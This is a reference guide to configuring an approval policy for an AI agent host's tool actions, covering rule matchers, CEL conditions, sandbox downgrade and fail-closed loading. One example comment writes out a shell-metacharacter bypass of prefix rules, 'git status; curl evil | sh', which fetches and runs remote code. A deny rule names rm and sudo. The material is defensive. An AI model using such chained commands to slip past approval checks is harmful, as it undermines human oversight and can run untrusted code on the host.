# Approval Policy Guide

`config/policy.yaml` decides which actions need operator approval before they
run. This guide is the authoring reference for the file. The engine is
canonical in [`host/src/host/policy.py`](../host/src/host/policy.py); its
decision ladder is pinned by `host/tests/test_policy.py`.

---

## Where the file lives

The policy sits in the config category of the active data dir:

```text
<data_dir>/config/policy.yaml
```

The data dir is `artifacts/` in a repo checkout, the `LISA_DATA_DIR` pin, a
`profiles/<name>` root when `LISA_PROFILE` is set, or `~/.lisa` by default —
see `HostConfig.from_env` in `host/config.py` for the precedence chain.

The engine re-reads the file on **every approval request**
(`host/policy_service.py`), so hand edits take effect immediately — no
process restart, even mid-session.

## The document at a glance

```yaml
version: 1
mode: ask
sandbox_downgrade: true
bare_requires_approval: true
allow: []
ask: []
deny: []
```

| Key | Type | Default | Purpose |
| --- | --- | --- | --- |
| `version` | `int` | `1` | Forward-compat scaffolding; v1 is the only schema today. |
| `mode` | `ask` \| `trust` \| `plan` | `ask` | Fallback dial for actions no rule or containment settles. |
| `sandbox_downgrade` | `bool` | `true` | Auto-approve sandboxed `execute` actions with genuine containment. |
| `bare_requires_approval` | `bool` | `true` | Prompt for unsandboxed `execute` even under `trust` mode. |
| `allow` | `list[rule]` | `[]` | Actions auto-approved without a prompt. |
| `ask` | `list[rule]` | `[]` | Actions that always surface a prompt. |
| `deny` | `list[rule]` | `[]` | Actions rejected outright. Deny is loud — a tool error, never a silent skip. |

## Rules

Each entry under `allow`/`ask`/`deny` is a matchers object:

```yaml
deny:
  - tool: bash_run
    effect: execute
    pack: lisa-pack-bash
    command_prefix: git push
    when: 'action.argv[0] == "git" && "push" in action.argv'
```

| Matcher | Matches | Notes |
| --- | --- | --- |
| `tool` | Exact `target_id` (e.g. `bash_run`). | |
| `effect` | Exact effect kind: `read`, `write`, `execute`, `external_write`. | |
| `pack` | Exact owning `pack_id`. | |
| `command_prefix` | The action's shell command starts with this string. | Meaningful only for `execute` tools that carry a command parameter. A plain prefix match — see `when` for token-level matching that closes the shell-metacharacter bypass. |
| `when` | A CEL boolean expression over the activation bindings. | All present matchers AND the expression must hold. See below. |

Rule semantics:

- **All present matchers must match** (AND). A rule with no matchers matches
  nothing — an empty rule is not a wildcard. A `when`-only rule is valid: the
  expression is a matcher.
- Evaluation order is fixed and independent of key order in the file:
  **deny → ask → allow, first match wins.** A deny always beats an allow.
- The command is read from the first non-empty of the parameters `command`,
  `argv`, `cmd`, `script` (`argv` lists are joined with spaces); leading
  whitespace is normalized.

### `when` expressions

A rule may carry a [`when`](https://github.com/google/cel-spec) — a CEL
boolean expression evaluated against one activation. CEL has no side effects,
no I/O, and no arbitrary code execution, so expressions are safe to evaluate
on every approval request without a sandbox. The compiled programs are cached
by expression text, and the containment fact is read only when some rule has
a `when` (expression-free policies pay zero extra I/O per decision).

Bindings (the same shape the model router exposes):

| Binding | Type | Meaning |
| --- | --- | --- |
| `action.tool` | `string` | The capability's `target_id`. |
| `action.effect` | `string` | The effect kind. |
| `action.pack` | `string` | The owning `pack_id`. |
| `action.command` | `string` | The extracted shell command string, or empty. |
| `action.argv` | `list<string>` | The command tokens: the `argv` parameter when the tool carries one, else `shlex.split` of the command string. |
| `action.parameters` | `map` | The invocation's full parameter mapping. |
| `identity.*` | `string` | `workspace_id`, `user_slug`, `surface_id`, `surface_type`, `mode_id`, `memory_scope`. |
| `containment` | `string` | The resolved sandbox state: `contained`, `degraded`, `none`, `unknown`. |

Examples:

```yaml
allow:
  # Only bare `git status`/`git log`, argument-count-checked — the prefix
  # matcher's bypass (git status; curl evil | sh) can't sneak past this.
  - tool: bash_run
    when: 'action.argv[0] == "git" && action.argv.size() <= 2'

deny:
  # Any argv that mentions rm or sudo, on any tool.
  - when: '("rm" in action.argv) || ("sudo" in action.argv)'

ask:
  # Prompt for shell-mode actions surfaced from any other mode.
  - when: 'identity.mode_id == "shell"'
```

**Quoting.** CEL string literals use double quotes, so single-quote the YAML
value (the same convention as the model router's `when:` rules). On the
`/policy rule add` command, pass the expression after `--when` unquoted or
wrapped in one outer shell quote — the command strips a whole-expression
wrapper but never touches the inner literals.

**Fail-closed semantics.** The policy's CEL use deliberately diverges from the
model router's on error:

- An expression that does not **compile** fails the whole document to the
  ask-mode default on load (the same fail-closed contract as corrupt YAML —
  one bad rule never widens what is allowed). `/policy` renders the load
  error and which rule failed; `/policy rule add` compile-checks before the
  write so a bad add is rejected instead of poisoning the document.
- An expression that fails at **evaluation** time (e.g. division by zero on
  an empty argv) prompts: the decision short-circuits to `ask` with the
  failing rule named. The router skips a failing rule and falls back to its
  static model pin — safe there, fail-open for a deny rule, so the policy
  inverts it.

## Decision order

For every approval-gated action, `decide()` walks a fixed, short-circuiting
ladder:

1. **Deny rules** — first match denies, loudly: the registry raises a tool
   error so the model can reroute instead of stalling on a prompt.
2. **Ask rules** — first match prompts.
3. **Allow rules** — first match auto-approves.
4. **Sandbox downgrade** — when `sandbox_downgrade` is on, an `execute`
   action whose containment fact is `contained` auto-approves. This step runs
   before the mode dial — the sandbox is the boundary — so a genuinely
   sandboxed command approves even under `plan` mode.
5. **Mode fallback** —
   - `read` always allows;
   - `plan` denies every effectful action;
   - `trust` allows `write`/`execute` unless the bare guard intervenes;
   - everything else (`ask` mode, or `external_write` under `trust`) prompts.

Two things steps 4–5 never auto-approve:

- `external_write` escapes the sandbox by definition and prompts even under
  `trust` mode.
- An unsandboxed `execute` prompts when `bare_requires_approval` is on:
  `trust` never silently allows a bare host run. The guard narrows `trust`
  only — `ask` already prompts and `plan` already denies, and `plan`'s deny
  outranks the guard's ask.

### Containment states

The sandbox fact is a small JSON file the executing pack writes; the host
never imports pack code:

```text
<data_dir>/run/<session_key>/sandbox-facts.json
```

| State | Meaning | Outcome for `execute` |
| --- | --- | --- |
| `contained` | The sandbox genuinely ran. | Auto-approve (step 4). |
| `degraded` | Sandbox present but could not run; reasons surface in the prompt. | Prompt. |
| `none` | No sandbox on this action. | No downgrade. |
| `unknown` | No fact file — the pack never wrote one. | Treated as not contained. |

`degraded`, `none`, and `unknown` all fail closed, so an unsandboxed `rm` can
never be auto-approved by mistake.

## Managing the policy at runtime

| Surface | Effect |
| --- | --- |
| `/policy` | Render the active document: mode, guards, rule lists (with remove addresses), and any load errors. |
| `/policy mode <m>` | Persist the dial; existing rule lists are preserved. |
| `/policy bare on` \| `off` | Toggle `bare_requires_approval`. |
| `/policy rule add <list> [flags]` | Append a rule — `--tool T`, `--effect E`, `--pack P`, `--prefix PX`, `--when EXPR` (the expression takes the raw remainder; it is compile-checked before the write). |
| `/policy rule remove <list>:<n>` | Drop the nth rule (1-based) from the named list. |
| `/policy rule list` | Render the rules with their `list:n` addresses. |
| `/approve <id> --remember [prefix]` | Approve once and persist an allow rule; the default prefix is the command's first two tokens (`git status` from `git status -sb`). |
| The `a` / `always` approval keys | Same as `--remember`: approve and persist. |

The same `/policy` grammar is reachable one-shot from the CLI host as
`lisa once policy ...` (e.g. `lisa once policy mode trust`,
`lisa once policy rule add ...`) — the once host intercepts the command
shape and dispatches it through the same host path.

The **host owns every policy write**: transports send command text and the
host serializes the document through `host.policy.write_policy`, which
rewrites the file with the standard commented header — a mode flip never
drops rules. Auto-approvals mint real, auditable receipts (records
transition to `approved`; the host's post-turn hook drives the
execute-continue loop) — never a silent skip — and are capped at
`host.policy.AUTO_APPROVE_TURN_CAP` (10) per turn. Beyond the cap the host
prompts instead of burning the receipt ledger on a runaway loop.

## Fail-closed behavior

- A missing, unreadable, invalid, or non-mapping `policy.yaml` resolves to
  the ask-mode default document with no rules. Every load error resolves
  toward prompting, never toward allowing. A `when` expression that does not
  compile fails the same way — the whole document loads as ask-mode defaults.
- A `when` expression that fails at evaluation time prompts (decision
  short-circuits to `ask`); it never skips the rule.
- Unknown effect kinds rank as the riskiest known tier.
- Unknown or unreadable containment is treated as *not* contained.

## Verified behavior

The engine's contract is pinned by tests; consult them as executable
examples when authoring rules:

- `host/tests/test_policy.py` — rule matching, the ladder, the downgrade,
  the bare guard, fail-closed loading, `--remember` writes.
- `host/tests/test_policy_command.py` — `/policy` render, mode dial, bare
  toggle, and a round-trip through `decide()`.
- `host/tests/test_policy_approvals.py` — the policy-decorating approval
  service and receipt minting for auto-approvals.
